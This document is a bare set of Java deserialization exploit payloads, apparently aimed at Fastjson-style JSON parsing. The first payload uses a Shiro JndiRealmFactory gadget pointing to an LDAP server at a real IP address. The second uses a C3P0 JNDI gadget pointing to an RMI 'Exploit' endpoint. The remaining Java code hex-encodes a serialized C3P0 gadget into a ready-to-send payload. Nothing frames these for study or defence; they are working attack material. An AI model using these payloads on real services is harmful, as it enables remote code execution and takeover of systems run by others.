{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory","jndiNames":["ldap://1.116.136.120:1600/TomcatBypass/TomcatEcho"],"Realms":[""],"a":"a"}



{"object":["com.mchange.v2.c3p0.JndiRefForwardingDataSource",{"jndiName":"rmi://localhost:8088/Exploit", "loginTimeout":0}]}

InputStream in = new FileInputStream("C3P0.ser");
byte[] data = toByteArray(in);
in.close();
String HexString = bytesToHexString(data, data.length);
String poc = "{\"object\":[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",{\"userOverridesAsString\":\"HexAsciiSerializedMap:"+ HexString + ";\"}]}";
System.out.println(poc);

public static byte[] toByteArray(InputStream in) throws IOException {
    byte[] classBytes;
    classBytes = new byte[in.available()];
    in.read(classBytes);
    in.close();
    return classBytes;
}

public static String bytesToHexString(byte[] bArray, int length) {
    StringBuffer sb = new StringBuffer(length);
    for(int i = 0; i < length; ++i) {
        String sTemp = Integer.toHexString(255 & bArray[i]);
        if (sTemp.length() < 2) {
            sb.append(0);
        }

        sb.append(sTemp.toUpperCase());
    }
    return sb.toString();
}
